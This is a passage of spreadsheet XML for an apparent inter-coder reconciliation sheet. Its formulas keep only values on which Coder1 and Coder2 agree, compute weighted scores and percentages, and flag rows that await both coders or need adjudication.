        <f>IF(AND(Coder1!R200&amp;""&lt;&gt;"",Coder1!R200&amp;""=Coder2!R200&amp;""),Coder1!R200,"")</f>
        <v/>
      </c>
      <c r="S200" s="14">
        <f>IF(AND(Coder1!S200&amp;""&lt;&gt;"",Coder1!S200&amp;""=Coder2!S200&amp;""),Coder1!S200,"")</f>
        <v/>
      </c>
      <c r="T200" s="14">
        <f>IF(AND(Coder1!T200&amp;""&lt;&gt;"",Coder1!T200&amp;""=Coder2!T200&amp;""),Coder1!T200,"")</f>
        <v/>
      </c>
      <c r="U200" s="14">
        <f>IF(AND(Coder1!U200&amp;""&lt;&gt;"",Coder1!U200&amp;""=Coder2!U200&amp;""),Coder1!U200,"")</f>
        <v/>
      </c>
      <c r="V200" s="14">
        <f>IF(AND(Coder1!V200&amp;""&lt;&gt;"",Coder1!V200&amp;""=Coder2!V200&amp;""),Coder1!V200,"")</f>
        <v/>
      </c>
      <c r="W200" s="14">
        <f>IF(AND(Coder1!W200&amp;""&lt;&gt;"",Coder1!W200&amp;""=Coder2!W200&amp;""),Coder1!W200,"")</f>
        <v/>
      </c>
      <c r="X200" s="14">
        <f>IF(AND(Coder1!X200&amp;""&lt;&gt;"",Coder1!X200&amp;""=Coder2!X200&amp;""),Coder1!X200,"")</f>
        <v/>
      </c>
      <c r="Y200" s="14">
        <f>IF(AND(Coder1!Y200&amp;""&lt;&gt;"",Coder1!Y200&amp;""=Coder2!Y200&amp;""),Coder1!Y200,"")</f>
        <v/>
      </c>
      <c r="Z200" s="14">
        <f>IF(AND(Coder1!Z200&amp;""&lt;&gt;"",Coder1!Z200&amp;""=Coder2!Z200&amp;""),Coder1!Z200,"")</f>
        <v/>
      </c>
      <c r="AA200" s="14">
        <f>IF(AND(Coder1!AA200&amp;""&lt;&gt;"",Coder1!AA200&amp;""=Coder2!AA200&amp;""),Coder1!AA200,"")</f>
        <v/>
      </c>
      <c r="AB200" s="14">
        <f>IF(AND(Coder1!AB200&amp;""&lt;&gt;"",Coder1!AB200&amp;""=Coder2!AB200&amp;""),Coder1!AB200,"")</f>
        <v/>
      </c>
      <c r="AC200" s="14">
        <f>IF(AND(Coder1!AC200&amp;""&lt;&gt;"",Coder1!AC200&amp;""=Coder2!AC200&amp;""),Coder1!AC200,"")</f>
        <v/>
      </c>
      <c r="AD200" s="14">
        <f>IF(AND(Coder1!AD200&amp;""&lt;&gt;"",Coder1!AD200&amp;""=Coder2!AD200&amp;""),Coder1!AD200,"")</f>
        <v/>
      </c>
      <c r="AE200" s="14">
        <f>IF(AND(Coder1!AE200&amp;""&lt;&gt;"",Coder1!AE200&amp;""=Coder2!AE200&amp;""),Coder1!AE200,"")</f>
        <v/>
      </c>
      <c r="AF200" s="14">
        <f>IF(AND(Coder1!AF200&amp;""&lt;&gt;"",Coder1!AF200&amp;""=Coder2!AF200&amp;""),Coder1!AF200,"")</f>
        <v/>
      </c>
      <c r="AG200" s="14">
        <f>IF(AND(Coder1!AG200&amp;""&lt;&gt;"",Coder1!AG200&amp;""=Coder2!AG200&amp;""),Coder1!AG200,"")</f>
        <v/>
      </c>
      <c r="AH200" s="14">
        <f>IF(AND(Coder1!AH200&amp;""&lt;&gt;"",Coder1!AH200&amp;""=Coder2!AH200&amp;""),Coder1!AH200,"")</f>
        <v/>
      </c>
      <c r="AI200" s="11">
        <f>IF(COUNT(E200:L200)=0,"",SUM(E200:L200))</f>
        <v/>
      </c>
      <c r="AJ200" s="11">
        <f>IF(AI200="","",N(E200)*3+N(F200)*2+N(G200)*2+N(H200)*2+N(I200)*2+N(J200)*3+N(K200)*3+N(L200)*3)</f>
        <v/>
      </c>
      <c r="AK200" s="11">
        <f>IF(AI200="","",COUNTIF(N200:AG200,1))</f>
        <v/>
      </c>
      <c r="AL200" s="11">
        <f>IF(OR(AJ200="",AJ200=0),"",ROUND(100*(AJ200-AK200)/AJ200,1))</f>
        <v/>
      </c>
      <c r="AM200" s="11">
        <f>IF(AND(Coder1!AN200=1,Coder2!AN200=1),IF(COUNTBLANK(E200:AH200)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN200" s="11">
        <f>IF(AND(Coder1!AN200=1,Coder2!AN200=1),IF(SUMPRODUCT(--(Coder1!E200:AH200&amp;""&lt;&gt;Coder2!E200:AH200&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO200" s="11" t="n"/>
    </row>
    <row r="201">
      <c r="A201" s="11">
        <f>Coder1!A201</f>
        <v/>
      </c>
      <c r="B201" s="11">
        <f>Coder1!B201</f>
        <v/>
      </c>
      <c r="C201" s="11">
        <f>Coder1!C201</f>
        <v/>
      </c>
      <c r="D201" s="11">
        <f>Coder1!D201</f>
        <v/>
      </c>
      <c r="E201" s="14">
        <f>IF(AND(Coder1!E201&amp;""&lt;&gt;"",Coder1!E201&amp;""=Coder2!E201&amp;""),Coder1!E201,"")</f>
        <v/>
      </c>
      <c r="F201" s="14">
        <f>IF(AND(Coder1!F201&amp;""&lt;&gt;"",Coder1!F201&amp;""=Coder2!F201&amp;""),Coder1!F201,"")</f>
        <v/>
      </c>
      <c r="G201" s="14">
        <f>IF(AND(Coder1!G201&amp;""&lt;&gt;"",Coder1!G201&amp;""=Coder2!G201&amp;""),Coder1!G201,"")</f>
        <v/>
      </c>
      <c r="H201" s="14">
        <f>IF(AND(Coder1!H201&amp;""&lt;&gt;"",Coder1!H201&amp;""=Coder2!H201&amp;""),Coder1!H201,"")</f>
        <v/>
      </c>
      <c r="I201" s="14">
        <f>IF(AND(Coder1!I201&amp;""&lt;&gt;"",Coder1!I201&amp;""=Coder2!I201&amp;""),Coder1!I201,"")</f>
        <v/>
      </c>
      <c r="J201" s="14">
        <f>IF(AND(Coder1!J201&amp;""&lt;&gt;"",Coder1!J201&amp;""=Coder2!J201&amp;""),Coder1!J201,"")</f>
        <v/>
      </c>
      <c r="K201" s="14">
        <f>IF(AND(Coder1!K201&amp;""&lt;&gt;"",Coder1!K201&amp;""=Coder2!K201&amp;""),Coder1!K201,"")</f>
        <v/>
      </c>
      <c r="L201" s="14">
        <f>IF(AND(Coder1!L201&amp;""&lt;&gt;"",Coder1!L201&amp;""=Coder2!L201&amp;""),Coder1!L201,"")</f>
        <v/>
      </c>
      <c r="M201" s="14">
        <f>IF(AND(Coder1!M201&amp;""&lt;&gt;"",Coder1!M201&amp;""=Coder2!M201&amp;""),Coder1!M201,"")</f>
        <v/>
      </c>
      <c r="N201" s="14">
        <f>IF(AND(Coder1!N201&amp;""&lt;&gt;"",Coder1!N201&amp;""=Coder2!N201&amp;""),Coder1!N201,"")</f>
        <v/>
      </c>
      <c r="O201" s="14">
        <f>IF(AND(Coder1!O201&amp;""&lt;&gt;"",Coder1!O201&amp;""=Coder2!O201&amp;""),Coder1!O201,"")</f>
        <v/>
      </c>
      <c r="P201" s="14">
        <f>IF(AND(Coder1!P201&amp;""&lt;&gt;"",Coder1!P201&amp;""=Coder2!P201&amp;""),Coder1!P201,"")</f>
        <v/>
      </c>
      <c r="Q201" s="14">
        <f>IF(AND(Coder1!Q201&amp;""&lt;&gt;"",Coder1!Q201&amp;""=Coder2!Q201&amp;""),Coder1!Q201,"")</f>
        <v/>
      </c>
      <c r="R201" s="14">
        <f>IF(AND(Coder1!R201&amp;""&lt;&gt;"",Coder1!R201&amp;""=Coder2!R201&amp;""),Coder1!R201,"")</f>
        <v/>
      </c>
      <c r="S201" s="14">
        <f>IF(AND(Coder1!S201&amp;""&lt;&gt;"",Coder1!S201&amp;""=Coder2!S201&amp;""),Coder1!S201,"")</f>
        <v/>
      </c>
      <c r="T201" s="14">
        <f>IF(AND(Coder1!T201&amp;""&lt;&gt;"",Coder1!T201&amp;""=Coder2!T201&amp;""),Coder1!T201,"")</f>
        <v/>
      </c>
      <c r="U201" s="14">
        <f>IF(AND(Coder1!U201&amp;""&lt;&gt;"",Coder1!U201&amp;""=Coder2!U201&amp;""),Coder1!U201,"")</f>
        <v/>
      </c>
      <c r="V201" s="14">
        <f>IF(AND(Coder1!V201&amp;""&lt;&gt;"",Coder1!V201&amp;""=Coder2!V201&amp;""),Coder1!V201,"")</f>
        <v/>
      </c>
      <c r="W201" s="14">
        <f>IF(AND(Coder1!W201&amp;""&lt;&gt;"",Coder1!W201&amp;""=Coder2!W201&amp;""),Coder1!W201,"")</f>
        <v/>
      </c>
      <c r="X201" s="14">
        <f>IF(AND(Coder1!X201&amp;""&lt;&gt;"",Coder1!X201&amp;""=Coder2!X201&amp;""),Coder1!X201,"")</f>
        <v/>
      </c>
      <c r="Y201" s="14">
        <f>IF(AND(Coder1!Y201&amp;""&lt;&gt;"",Coder1!Y201&amp;""=Coder2!Y201&amp;""),Coder1!Y201,"")</f>
        <v/>
      </c>
      <c r="Z201" s="14">
        <f>IF(AND(Coder1!Z201&amp;""&lt;&gt;"",Coder1!Z201&amp;""=Coder2!Z201&amp;""),Coder1!Z201,"")</f>
        <v/>
      </c>
      <c r="AA201" s="14">
        <f>IF(AND(Coder1!AA201&amp;""&lt;&gt;"",Coder1!AA201&amp;""=Coder2!AA201&amp;""),Coder1!AA201,"")</f>
        <v/>
      </c>
      <c r="AB201" s="14">
        <f>IF(AND(Coder1!AB201&amp;""&lt;&gt;"",Coder1!AB201&amp;""=Coder2!AB201&amp;""),Coder1!AB201,"")</f>
        <v/>
      </c>
      <c r="AC201" s="14">
        <f>IF(AND(Coder1!AC201&amp;""&lt;&gt;"",Coder1!AC201&amp;""=Coder2!AC201&amp;""),Coder1!AC201,"")</f>
        <v/>
      </c>
      <c r="AD201" s="14">
        <f>IF(AND(Coder1!AD201&amp;""&lt;&gt;"",Coder1!AD201&amp;""=Coder2!AD201&amp;""),Coder1!AD201,"")</f>
        <v/>
      </c>
      <c r="AE201" s="14">
        <f>IF(AND(Coder1!AE201&amp;""&lt;&gt;"",Coder1!AE201&amp;""=Coder2!AE201&amp;""),Coder1!AE201,"")</f>
        <v/>
      </c>
      <c r="AF201" s="14">
        <f>IF(AND(Coder1!AF201&amp;""&lt;&gt;"",Coder1!AF201&amp;""=Coder2!AF201&amp;""),Coder1!AF201,"")</f>
        <v/>
      </c>
      <c r="AG201" s="14">
        <f>IF(AND(Coder1!AG201&amp;""&lt;&gt;"",Coder1!AG201&amp;""=Coder2!AG201&amp;""),Coder1!AG201,"")</f>
        <v/>
      </c>
      <c r="AH201" s="14">
        <f>IF(AND(Coder1!AH201&amp;""&lt;&gt;"",Coder1!AH201&amp;""=Coder2!AH201&amp;""),Coder1!AH201,"")</f>
        <v/>
      </c>
      <c r="AI201" s="11">
        <f>IF(COUNT(E201:L201)=0,"",SUM(E201:L201))</f>
        <v/>
      </c>
      <c r="AJ201" s="11">
        <f>IF(AI201="","",N(E201)*3+N(F201)*2+N(G201)*2+N(H201)*2+N(I201)*2+N(J201)*3+N(K201)*3+N(L201)*3)</f>
        <v/>
      </c>
      <c r="AK201" s="11">
        <f>IF(AI201="","",COUNTIF(N201:AG201,1))</f>
        <v/>
      </c>
      <c r="AL201" s="11">
        <f>IF(OR(AJ201="",AJ201=0),"",ROUND(100*(AJ201-AK201)/AJ201,1))</f>
        <v/>
      </c>
      <c r="AM201" s="11">
        <f>IF(AND(Coder1!AN201=1,Coder2!AN201=1),IF(COUNTBLANK(E201:AH201)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN201" s="11">
        <f>IF(AND(Coder1!AN201=1,Coder2!AN201=1),IF(SUMPRODUCT(--(Coder1!E201:AH201&amp;""&lt;&gt;Coder2!E201:AH201&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO201" s="11" t="n"/>
    </row>
    <row r="202">
      <c r="A202" s="11">
        <f>Coder1!A202</f>
        <v/>
      </c>
      <c r="B202" s="11">
        <f>Coder1!B202</f>
        <v/>
      </c>
      <c r="C202" s="11">
        <f>Coder1!C202</f>
        <v/>
      </c>
      <c r="D202" s="11">
        <f>Coder1!D202</f>
        <v/>
      </c>
      <c r="E202" s="14">
        <f>IF(AND(Coder1!E202&amp;""&lt;&gt;"",Coder1!E202&amp;""=Coder2!E202&amp;""),Coder1!E202,"")</f>
        <v/>
      </c>
      <c r="F202" s="14">
        <f>IF(AND(Coder1!F202&amp;""&lt;&gt;"",Coder1!F202&amp;""=Coder2!F202&amp;""),Coder1!F202,"")</f>
        <v/>
      </c>
      <c r="G202" s="14">
        <f>IF(AND(Coder1!G202&amp;""&lt;&gt;"",Coder1!G202&amp;""=Coder2!G202&amp;""),Coder1!G202,"")</f>
        <v/>
      </c>
      <c r="H202" s="14">
        <f>IF(AND(Coder1!H202&amp;""&lt;&gt;"",Coder1!H202&amp;""=Coder2!H202&amp;""),Coder1!H202,"")</f>
        <v/>
      </c>
      <c r="I202" s="14">
        <f>IF(AND(Coder1!I202&amp;""&lt;&gt;"",Coder1!I202&amp;""=Coder2!I202&amp;""),Coder1!I202,"")</f>
        <v/>
      </c>
      <c r="J202" s="14">
        <f>IF(AND(Coder1!J202&amp;""&lt;&gt;"",Coder1!J202&amp;""=Coder2!J202&amp;""),Coder1!J202,"")</f>
        <v/>
      </c>
      <c r="K202" s="14">
        <f>IF(AND(Coder1!K202&amp;""&lt;&gt;"",Coder1!K202&amp;""=Coder2!K202&amp;""),Coder1!K202,"")</f>
        <v/>
      </c>
      <c r="L202" s="14">
        <f>IF(AND(Coder1!L202&amp;""&lt;&gt;"",Coder1!L202&amp;""=Coder2!L202&amp;""),Coder1!L202,"")</f>
        <v/>
      </c>
      <c r="M202" s="14">
        <f>IF(AND(Coder1!M202&amp;""&lt;&gt;"",Coder1!M202&amp;""=Coder2!M202&amp;""),Coder1!M202,"")</f>
        <v/>
      </c>
      <c r="N202" s="14">
        <f>IF(AND(Coder1!N202&amp;""&lt;&gt;"",Coder1!N202&amp;""=Coder2!N202&amp;""),Coder1!N202,"")</f>
        <v/>
      </c>
      <c r="O202" s="14">
        <f>IF(AND(Coder1!O202&amp;""&lt;&gt;"",Coder1!O202&amp;""=Coder2!O202&amp;""),Coder1!O202,"")</f>
        <v/>
      </c>
      <c r="P202" s="14">
        <f>IF(AND(Coder1!P202&amp;""&lt;&gt;"",Coder1!P202&amp;""=Coder2!P202&amp;""),Coder1!P202,"")</f>
        <v/>
      </c>
      <c r="Q202" s="14">
        <f>IF(AND(Coder1!Q202&amp;""&lt;&gt;"",Coder1!Q202&amp;""=Coder2!Q202&amp;""),Coder1!Q202,"")</f>
        <v/>
      </c>
      <c r="R202" s="14">
        <f>IF(AND(Coder1!R202&amp;""&lt;&gt;"",Coder1!R202&amp;""=Coder2!R202&amp;""),Coder1!R202,"")</f>
        <v/>
      </c>
      <c r="S202" s="14">
        <f>IF(AND(Coder1!S202&amp;""&lt;&gt;"",Coder1!S202&amp;""=Coder2!S202&amp;""),Coder1!S202,"")</f>
        <v/>
      </c>
      <c r="T202" s="14">
        <f>IF(AND(Coder1!T202&amp;""&lt;&gt;"",Coder1!T202&amp;""=Coder2!T202&amp;""),Coder1!T202,"")</f>
        <v/>
      </c>
      <c r="U202" s="14">
        <f>IF(AND(Coder1!U202&amp;""&lt;&gt;"",Coder1!U202&amp;""=Coder2!U202&amp;""),Coder1!U202,"")</f>
        <v/>
      </c>
      <c r="V202" s="14">
        <f>IF(AND(Coder1!V202&amp;""&lt;&gt;"",Coder1!V202&amp;""=Coder2!V202&amp;""),Coder1!V202,"")</f>
        <v/>
      </c>
      <c r="W202" s="14">
        <f>IF(AND(Coder1!W202&amp;""&lt;&gt;"",Coder1!W202&amp;""=Coder2!W202&amp;""),Coder1!W202,"")</f>
        <v/>
      </c>
      <c r="X202" s="14">
        <f>IF(AND(Coder1!X202&amp;""&lt;&gt;"",Coder1!X202&amp;""=Coder2!X202&amp;""),Coder1!X202,"")</f>
        <v/>
      </c>
      <c r="Y202" s="14">
        <f>IF(AND(Coder1!Y202&amp;""&lt;&gt;"",Coder1!Y202&amp;""=Coder2!Y202&amp;""),Coder1!Y202,"")</f>
        <v/>
      </c>
      <c r="Z202" s="14">
        <f>IF(AND(Coder1!Z202&amp;""&lt;&gt;"",Coder1!Z202&amp;""=Coder2!Z202&amp;""),Coder1!Z202,"")</f>
        <v/>
      </c>
      <c r="AA202" s="14">
        <f>IF(AND(Coder1!AA202&amp;""&lt;&gt;"",Coder1!AA202&amp;""=Coder2!AA202&amp;""),Coder1!AA202,"")</f>
        <v/>
      </c>
      <c r="AB202" s="14">
        <f>IF(AND(Coder1!AB202&amp;""&lt;&gt;"",Coder1!AB202&amp;""=Coder2!AB202&amp;""),Coder1!AB202,"")</f>
        <v/>
      </c>
      <c r="AC202" s="14">
        <f>IF(AND(Coder1!AC202&amp;""&lt;&gt;"",Coder1!AC202&amp;""=Coder2!AC202&amp;""),Coder1!AC202,"")</f>
        <v/>
      </c>
      <c r="AD202" s="14">
        <f>IF(AND(Coder1!AD202&amp;""&lt;&gt;"",Coder1!AD202&amp;""=Coder2!AD202&amp;""),Coder1!AD202,"")</f>
        <v/>
      </c>
      <c r="AE202" s="14">
        <f>IF(AND(Coder1!AE202&amp;""&lt;&gt;"",Coder1!AE202&amp;""=Coder2!AE202&amp;""),Coder1!AE202,"")</f>
        <v/>
      </c>
      <c r="AF202" s="14">
        <f>IF(AND(Coder1!AF202&amp;""&lt;&gt;"",Coder1!AF202&amp;""=Coder2!AF202&amp;""),Coder1!AF202,"")</f>
        <v/>
      </c>
      <c r="AG202" s="14">
        <f>IF(AND(Coder1!AG202&amp;""&lt;&gt;"",Coder1!AG202&amp;""=Coder2!AG202&amp;""),Coder1!AG202,"")</f>
        <v/>
      </c>
      <c r="AH202" s="14">
        <f>IF(AND(Coder1!AH202&amp;""&lt;&gt;"",Coder1!AH202&amp;""=Coder2!AH202&amp;""),Coder1!AH202,"")</f>
        <v/>
      </c>
      <c r="AI202" s="11">
        <f>IF(COUNT(E202:L202)=0,"",SUM(E202:L202))</f>
        <v/>
      </c>
      <c r="AJ202" s="11">
        <f>IF(AI202="","",N(E202)*3+N(F202)*2+N(G202)*2+N(H202)*2+N(I202)*2+N(J202)*3+N(K202)*3+N(L202)*3)</f>
        <v/>
      </c>
      <c r="AK202" s="11">
        <f>IF(AI202="","",COUNTIF(N202:AG202,1))</f>
        <v/>
      </c>
      <c r="AL202" s="11">
        <f>IF(OR(AJ202="",AJ202=0),"",ROUND(100*(AJ202-AK202)/AJ202,1))</f>
        <v/>
      </c>
      <c r="AM202" s="11">
        <f>IF(AND(Coder1!AN202=1,Coder2!AN202=1),IF(COUNTBLANK(E202:AH202)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN202" s="11">
        <f>IF(AND(Coder1!AN202=1,Coder2!AN202=1),IF(SUMPRODUCT(--(Coder1!E202:AH202&amp;""&lt;&gt;Coder2!E202:AH202&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO202" s="11" t="n"/>
    </row>
    <row r="203">
      <c r="A203" s="11">
        <f>Coder1!A203</f>
        <v/>
      </c>
      <c r="B203" s="11">
        <f>Coder1!B203</f>
        <v/>
      </c>
      <c r="C203" s="11">
        <f>Coder1!C203</f>
        <v/>
      </c>
      <c r="D203" s="11">
        <f>Coder1!D203</f>
        <v/>
      </c>
      <c r="E203" s="14">
        <f>IF(AND(Coder1!E203&amp;""&lt;&gt;"",Coder1!E203&amp;""=Coder2!E203&amp;""),Coder1!E203,"")</f>
        <v/>
      </c>
      <c r="F203" s="14">
        <f>IF(AND(Coder1!F203&amp;""&lt;&gt;"",Coder1!F203&amp;""=Coder2!F203&amp;""),Coder1!F203,"")</f>
        <v/>
      </c>
      <c r="G203" s="14">
        <f>IF(AND(Coder1!G203&amp;""&lt;&gt;"",Coder1!G203&amp;""=Coder2!G203&amp;""),Coder1!G203,"")</f>
        <v/>
      </c>
      <c r="H203" s="14">
        <f>IF(AND(Coder1!H203&amp;""&lt;&gt;"",Coder1!H203&amp;""=Coder2!H203&amp;""),Coder1!H203,"")</f>
        <v/>
      </c>
      <c r="I203" s="14">
        <f>IF(AND(Coder1!I203&amp;""&lt;&gt;"",Coder1!I203&amp;""=Coder2!I203&amp;""),Coder1!I203,"")</f>
        <v/>
      </c>
      <c r="J203" s="14">
        <f>IF(AND(Coder1!J203&amp;""&lt;&gt;"",Coder1!J203&amp;""=Coder2!J203&amp;""),Coder1!J203,"")</f>
        <v/>
      </c>
      <c r="K203" s="14">
        <f>IF(AND(Coder1!K203&amp;""&lt;&gt;"",Coder1!K203&amp;""=Coder2!K203&amp;""),Coder1!K203,"")</f>
        <v/>
      </c>
      <c r="L203" s="14">
        <f>IF(AND(Coder1!L203&amp;""&lt;&gt;"",Coder1!L203&amp;""=Coder2!L203&amp;""),Coder1!L203,"")</f>
        <v/>
      </c>
      <c r="M203" s="14">
        <f>IF(AND(Coder1!M203&amp;""&lt;&gt;"",Coder1!M203&amp;""=Coder2!M203&amp;""),Coder1!M203,"")</f>
        <v/>
      </c>
      <c r="N203" s="14">
        <f>IF(AND(Coder1!N203&amp;""&lt;&gt;"",Coder1!N203&amp;""=Coder2!N203&amp;""),Coder1!N203,"")</f>
        <v/>
      </c>
      <c r="O203" s="14">
        <f>IF(AND(Coder1!O203&amp;""&lt;&gt;"",Coder1!O203&amp;""=Coder2!O203&amp;""),Coder1!O203,"")</f>
        <v/>
      </c>
      <c r="P203" s="14">
        <f>IF(AND(Coder1!P203&amp;""&lt;&gt;"",Coder1!P203&amp;""=Coder2!P203&amp;""),Coder1!P203,"")</f>
        <v/>
      </c>
      <c r="Q203" s="14">
        <f>IF(AND(Coder1!Q203&amp;""&lt;&gt;"",Coder1!Q203&amp;""=Coder2!Q203&amp;""),Coder1!Q203,"")</f>
        <v/>
      </c>
      <c r="R203" s="14">
        <f>IF(AND(Coder1!R203&amp;""&lt;&gt;"",Coder1!R203&amp;""=Coder2!R203&amp;""),Coder1!R203,"")</f>
        <v/>
      </c>
      <c r="S203" s="14">
        <f>IF(AND(Coder1!S203&amp;""&lt;&gt;"",Coder1!S203&amp;""=Coder2!S203&amp;""),Coder1!S203,"")</f>
        <v/>
      </c>
      <c r="T203" s="14">
        <f>IF(AND(Coder1!T203&amp;""&lt;&gt;"",Coder1!T203&amp;""=Coder2!T203&amp;""),Coder1!T203,"")</f>
        <v/>
      </c>
      <c r="U203" s="14">
        <f>IF(AND(Coder1!U203&amp;""&lt;&gt;"",Coder1!U203&amp;""=Coder2!U203&amp;""),Coder1!U203,"")</f>
        <v/>
      </c>
      <c r="V203" s="14">
        <f>IF(AND(Coder1!V203&amp;""&lt;&gt;"",Coder1!V203&amp;""=Coder2!V203&amp;""),Coder1!V203,"")</f>
        <v/>
      </c>
      <c r="W203" s="14">
        <f>IF(AND(Coder1!W203&amp;""&lt;&gt;"",Coder1!W203&amp;""=Coder2!W203&amp;""),Coder1!W203,"")</f>
        <v/>
      </c>
      <c r="X203" s="14">
        <f>IF(AND(Coder1!X203&amp;""&lt;&gt;"",Coder1!X203&amp;""=Coder2!X203&amp;""),Coder1!X203,"")</f>
        <v/>
      </c>
      <c r="Y203" s="14">
        <f>IF(AND(Coder1!Y203&amp;""&lt;&gt;"",Coder1!Y203&amp;""=Coder2!Y203&amp;""),Coder1!Y203,"")</f>
        <v/>
      </c>
      <c r="Z203" s="14">
        <f>IF(AND(Coder1!Z203&amp;""&lt;&gt;"",Coder1!Z203&amp;""=Coder2!Z203&amp;""),Coder1!Z203,"")</f>
        <v/>
      </c>
      <c r="AA203" s="14">
        <f>IF(AND(Coder1!AA203&amp;""&lt;&gt;"",Coder1!AA203&amp;""=Coder2!AA203&amp;""),Coder1!AA203,"")</f>
        <v/>
      </c>
      <c r="AB203" s="14">
        <f>IF(AND(Coder1!AB203&amp;""&lt;&gt;"",Coder1!AB203&amp;""=Coder2!AB203&amp;""),Coder1!AB203,"")</f>
        <v/>
      </c>
      <c r="AC203" s="14">
        <f>IF(AND(Coder1!AC203&amp;""&lt;&gt;"",Coder1!AC203&amp;""=Coder2!AC203&amp;""),Coder1!AC203,"")</f>
        <v/>
      </c>
      <c r="AD203" s="14">
        <f>IF(AND(Coder1!AD203&amp;""&lt;&gt;"",Coder1!AD203&amp;""=Coder2!AD203&amp;""),Coder1!AD203,"")</f>
        <v/>
      </c>
      <c r="AE203" s="14">
        <f>IF(AND(Coder1!AE203&amp;""&lt;&gt;"",Coder1!AE203&amp;""=Coder2!AE203&amp;""),Coder1!AE203,"")</f>
        <v/>
      </c>
      <c r="AF203" s="14">
        <f>IF(AND(Coder1!AF203&amp;""&lt;&gt;"",Coder1!AF203&amp;""=Coder2!AF203&amp;""),Coder1!AF203,"")</f>
        <v/>
      </c>
      <c r="AG203" s="14">
        <f>IF(AND(Coder1!AG203&amp;""&lt;&gt;"",Coder1!AG203&amp;""=Coder2!AG203&amp;""),Coder1!AG203,"")</f>
        <v/>
      </c>
      <c r="AH203" s="14">
        <f>IF(AND(Coder1!AH203&amp;""&lt;&gt;"",Coder1!AH203&amp;""=Coder2!AH203&amp;""),Coder1!AH203,"")</f>
        <v/>
      </c>
      <c r="AI203" s="11">
        <f>IF(COUNT(E203:L203)=0,"",SUM(E203:L203))</f>
        <v/>
      </c>
      <c r="AJ203" s="11">
        <f>IF(AI203="","",N(E203)*3+N(F203)*2+N(G203)*2+N(H203)*2+N(I203)*2+N(J203)*3+N(K203)*3+N(L203)*3)</f>
        <v/>
      </c>
      <c r="AK203" s="11">
        <f>IF(AI203="","",COUNTIF(N203:AG203,1))</f>
        <v/>
      </c>
      <c r="AL203" s="11">
        <f>IF(OR(AJ203="",AJ203=0),"",ROUND(100*(AJ203-AK203)/AJ203,1))</f>
        <v/>
      </c>
      <c r="AM203" s="11">
        <f>IF(AND(Coder1!AN203=1,Coder2!AN203=1),IF(COUNTBLANK(E203:AH203)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN203" s="11">
        <f>IF(AND(Coder1!AN203=1,Coder2!AN203=1),IF(SUMPRODUCT(--(Coder1!E203:AH203&amp;""&lt;&gt;Coder2!E203:AH203&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO203" s="11" t="n"/>
    </row>
    <row r="204">
      <c r="A204" s="11">
        <f>Coder1!A204</f>
        <v/>
      </c>
      <c r="B204" s="11">
        <f>Coder1!B204</f>
        <v/>
      </c>
      <c r="C204" s="11">
        <f>Coder1!C204</f>
        <v/>
      </c>
      <c r="D204" s="11">
        <f>Coder1!D204</f>
        <v/>
      </c>
      <c r="E204" s="14">
        <f>IF(AND(Coder1!E204&amp;""&lt;&gt;"",Coder1!E204&amp;""=Coder2!E204&amp;""),Coder1!E204,"")</f>
        <v/>
      </c>
      <c r="F204" s="14">
        <f>IF(AND(Coder1!F204&amp;""&lt;&gt;"",Coder1!F204&amp;""=Coder2!F204&amp;""),Coder1!F204,"")</f>
        <v/>
      </c>
      <c r="G204" s="14">
        <f>IF(AND(Coder1!G204&amp;""&lt;&gt;"",Coder1!G204&amp;""=Coder2!G204&amp;""),Coder1!G204,"")</f>
        <v/>
      </c>
      <c r="H204" s="14">
        <f>IF(AND(Coder1!H204&amp;""&lt;&gt;"",Coder1!H204&amp;""=Coder2!H204&amp;""),Coder1!H204,"")</f>
        <v/>
      </c>
      <c r="I204" s="14">
        <f>IF(AND(Coder1!I204&amp;""&lt;&gt;"",Coder1!I204&amp;""=Coder2!I204&amp;""),Coder1!I204,"")</f>
        <v/>
      </c>
      <c r="J204" s="14">
        <f>IF(AND(Coder1!J204&amp;""&lt;&gt;"",Coder1!J204&amp;""=Coder2!J204&amp;""),Coder1!J204,"")</f>
        <v/>
      </c>
      <c r="K204" s="14">
        <f>IF(AND(Coder1!K204&amp;""&lt;&gt;"",Coder1!K204&amp;""=Coder2!K204&amp;""),Coder1!K204,"")</f>
        <v/>
      </c>
      <c r="L204" s="14">
        <f>IF(AND(Coder1!L204&amp;""&lt;&gt;"",Coder1!L204&amp;""=Coder2!L204&amp;""),Coder1!L204,"")</f>
        <v/>
      </c>
      <c r="M204" s="14">
        <f>IF(AND(Coder1!M204&amp;""&lt;&gt;"",Coder1!M204&amp;""=Coder2!M204&amp;""),Coder1!M204,"")</f>
        <v/>
      </c>
      <c r="N204" s="14">
        <f>IF(AND(Coder1!N204&amp;""&lt;&gt;"",Coder1!N204&amp;""=Coder2!N204&amp;""),Coder1!N204,"")</f>
        <v/>
      </c>
      <c r="O204" s="14">
        <f>IF(AND(Coder1!O204&amp;""&lt;&gt;"",Coder1!O204&amp;""=Coder2!O204&amp;""),Coder1!O204,"")</f>
        <v/>
      </c>
      <c r="P204" s="14">
        <f>IF(AND(Coder1!P204&amp;""&lt;&gt;"",Coder1!P204&amp;""=Coder2!P204&amp;""),Coder1!P204,"")</f>
        <v/>
      </c>
      <c r="Q204" s="14">
        <f>IF(AND(Coder1!Q204&amp;""&lt;&gt;"",Coder1!Q204&amp;""=Coder2!Q204&amp;""),Coder1!Q204,"")</f>
        <v/>
      </c>
      <c r="R204" s="14">
        <f>IF(AND(Coder1!R204&amp;""&lt;&gt;"",Coder1!R204&amp;""=Coder2!R204&amp;""),Coder1!R204,"")</f>
        <v/>
      </c>
      <c r="S204" s="14">
        <f>IF(AND(Coder1!S204&amp;""&lt;&gt;"",Coder1!S204&amp;""=Coder2!S204&amp;""),Coder1!S204,"")</f>
        <v/>
      </c>
      <c r="T204" s="14">
        <f>IF(AND(Coder1!T204&amp;""&lt;&gt;"",Coder1!T204&amp;""=Coder2!T204&amp;""),Coder1!T204,"")</f>
        <v/>
      </c>
      <c r="U204" s="14">
